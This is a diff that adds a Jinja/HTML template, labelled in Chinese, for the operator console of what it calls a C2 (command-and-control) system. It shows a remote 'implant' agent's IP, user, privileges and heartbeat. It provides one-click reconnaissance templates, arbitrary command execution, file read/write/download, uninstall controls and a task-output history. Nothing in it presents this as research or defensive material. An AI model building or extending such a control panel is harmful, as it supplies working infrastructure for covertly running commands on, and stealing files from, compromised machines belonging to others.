@@ -1,0 +1,154 @@
+{% extends 'admin/base.html' %}
+{% from 'admin/_macros.html' import page_header, metric_card, section_header, empty_state, badge %}
+{% block content %}
+<style>
+/* mono readouts for machine data */
+.c2-mono { font-family:"Fira Code", ui-monospace, monospace; font-variant-numeric:tabular-nums; }
+/* auto-refresh toggle: hover affordance */
+#auto-refresh-indicator { transition:color 160ms ease, border-color 160ms ease; }
+#auto-refresh-indicator:hover { color:#67e8f9; border-color:rgba(34, 211, 238, 0.45); }
+</style>
+{{ page_header('C2', 'Agent 控制台', agent.hostname or agent.agent_id[:16], [agent.status|status_zh, agent.privileges or 'user']) }}
+
+<div class="cards">
+  {{ metric_card('IP', '<span class="c2-mono">' ~ agent.source_ip ~ '</span>') }}
+  {{ metric_card('主机名', agent.hostname or '-') }}
+  {{ metric_card('系统', agent.os_name ~ ' ' ~ agent.os_version if agent.os_name else '-') }}
+  {{ metric_card('用户', agent.username or '-', 'default', agent.privileges) }}
+  {{ metric_card('最后心跳', '<span class="c2-mono">' ~ agent.last_seen_at.strftime('%H:%M:%S') ~ '</span>') }}
+  {{ metric_card('任务数', task_count) }}
+</div>
+
+<div class="grid-2" style="margin-top:14px">
+  <section class="panel">
+    {{ section_header('快速指令模板', '一键下发常用侦查命令') }}
+    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px">
+      {% for t in templates %}
+      <form method="post" action="/admin/c2/send-template" style="display:inline">
+        <input type="hidden" name="agent_id" value="{{ agent.agent_id }}" />
+        <input type="hidden" name="template_id" value="{{ t.id }}" />
+        <button type="submit" style="width:100%;font-size:11px;padding:10px 8px;text-align:left;display:flex;align-items:center;gap:6px;white-space:nowrap">
+          <span style="font-size:16px;flex-shrink:0">{{ t.icon }}</span>
+          <span>{{ t.label }}</span>
+        </button>
+      </form>
+      {% endfor %}
+    </div>
+  </section>
+
+  <section class="panel">
+    {{ section_header('自定义命令', '自由输入命令或文件路径') }}
+    <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/cmd" class="stack">
+      <select name="task_type" style="width:auto">
+        <option value="cmd">执行命令 (cmd)</option>
+        <option value="read_file">读取文件 (read_file)</option>
+        <option value="write_file">写入文件 (write_file)</option>
+        <option value="download">下载文件 (download)</option>
+        <option value="uninstall">卸载 Agent (uninstall)</option>
+      </select>
+      <input type="text" name="file_path" placeholder="文件路径 (读写文件时使用)" />
+      <textarea name="command" placeholder="命令或内容..." style="min-height:60px;font-family:inherit;font-size:13px"></textarea>
+      <button type="submit">发送命令</button>
+    </form>
+  </section>
+</div>
+
+<section class="panel" style="margin-top:14px">
+  {{ section_header('Agent 信息', 'Agent ID: ' ~ agent.agent_id) }}
+  <div class="grid-4">
+    <div class="card" style="padding:12px"><div class="muted">架构</div><div style="font-weight:650;margin-top:4px">{{ agent.arch or '-' }}</div></div>
+    <div class="card" style="padding:12px"><div class="muted">植入类型</div><div style="font-weight:650;margin-top:4px">{{ agent.payload_type or 'implant' }}</div></div>
+    <div class="card" style="padding:12px"><div class="muted">轮询间隔</div><div class="c2-mono" style="font-weight:650;margin-top:4px">{{ agent.poll_interval }}s</div></div>
+    <div class="card" style="padding:12px"><div class="muted">首次上线</div><div class="c2-mono" style="font-weight:650;margin-top:4px">{{ agent.first_seen_at.strftime('%m-%d %H:%M') }}</div></div>
+  </div>
+  <div style="margin-top:12px">
+    <form method="post" action="/admin/c2/agents/{{ agent.agent_id }}/delete" onsubmit="return confirm('确认删除该 Agent 及所有任务？不可撤销。')" style="display:inline">
+      <button class="secondary" type="submit">删除 Agent</button>
+    </form>
+  </div>
+</section>
+
+<section class="panel" style="margin-top:14px" id="tasks-section">
+  <div class="panel-header">
+    <div>
+      <h3 class="panel-title">任务历史</h3>
+      <div class="panel-subtitle">最近 100 条 — <span id="task-count">{{ tasks|length }}</span> 条记录 | <a href="?">刷新页面</a></div>
+    </div>
+    <div class="toolbar">
+      <span class="chip" id="auto-refresh-indicator" style="cursor:pointer" onclick="toggleAutoRefresh()">自动刷新: 关</span>
+    </div>
+  </div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>ID</th><th>类型</th><th>命令</th><th>状态</th><th>输出</th><th>创建</th><th>完成</th></tr>
+      </thead>
+      <tbody id="tasks-body">
+        {% for task in tasks %}
+        <tr>
+          <td><code>{{ task.id }}</code></td>
+          <td>
+            {% if task.task_type == 'cmd' %}{{ badge('cmd', 'info') }}
+            {% elif task.task_type == 'read_file' %}{{ badge('读', 'warning') }}
+            {% elif task.task_type == 'write_file' %}{{ badge('写', 'danger') }}
+            {% elif task.task_type == 'download' %}{{ badge('下载', 'info') }}
+            {% elif task.task_type == 'uninstall' %}{{ badge('卸载', 'danger') }}
+            {% else %}{{ badge(task.task_type, 'success') }}{% endif %}
+          </td>
+          <td><code style="font-size:11px">{{ (task.command or '')[:50] }}{% if (task.command or '')|length > 50 %}...{% endif %}</code></td>
+          <td>
+            {% if task.status == 'completed' %}{{ badge('完成', 'success') }}
+            {% elif task.status == 'failed' %}{{ badge('失败', 'danger') }}
+            {% elif task.status == 'dispatched' %}{{ badge('派发', 'warning') }}
+            {% elif task.status == 'queued' %}{{ badge('排队', 'info') }}
+            {% else %}{{ badge(task.status|status_zh, 'info') }}{% endif %}
+          </td>
+          <td>
+            {% if task.output %}
+              <details><summary style="cursor:pointer;font-size:11px;color:var(--theme-accent)">查看 ({{ task.output|length }} 字符)</summary>
+                <pre style="max-height:200px;max-width:500px;overflow:auto;font-size:11px;margin-top:4px">{{ task.output }}</pre>
+              </details>
+            {% else %}<span class="muted">-</span>{% endif %}
+          </td>
+          <td class="c2-mono" style="font-size:11px">{{ task.created_at.strftime('%m-%d %H:%M') }}</td>
+          <td class="c2-mono" style="font-size:11px">{{ task.completed_at.strftime('%m-%d %H:%M') if task.completed_at else '-' }}</td>
+        </tr>
+        {% endfor %}
+        {% if not tasks %}
+        {{ empty_state('暂无任务', '通过快速模板或自定义命令下发指令。', 7, 'C2') }}
+        {% endif %}
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<script>
+var AUTO_REFRESH = false;
+var REFRESH_INTERVAL = 5000;
+var timer = null;
+var lastTaskId = {{ (tasks|first).id if tasks else 0 }};
+
+function toggleAutoRefresh() {
+  AUTO_REFRESH = !AUTO_REFRESH;
+  var indicator = document.getElementById('auto-refresh-indicator');
+  if (AUTO_REFRESH) {
+    indicator.textContent = '自动刷新: 开 (5s)';
+    indicator.style.color = 'var(--theme-accent)';
+    timer = setInterval(checkNewTasks, REFRESH_INTERVAL);
+  } else {
+    indicator.textContent = '自动刷新: 关';
+    indicator.style.color = '';
+    if (timer) clearInterval(timer);
+  }
+}
+
+function checkNewTasks() {
+  var url = '/api/admin/c2/tasks?agent_id={{ agent.agent_id }}&since_id=' + lastTaskId;
+  fetch(url).then(function(r) { return r.json(); }).then(function(data) {
+    if (data.tasks && data.tasks.length > 0) {
+      location.reload();
+    }
+  }).catch(function(){});
+}
+</script>
+{% endblock %}
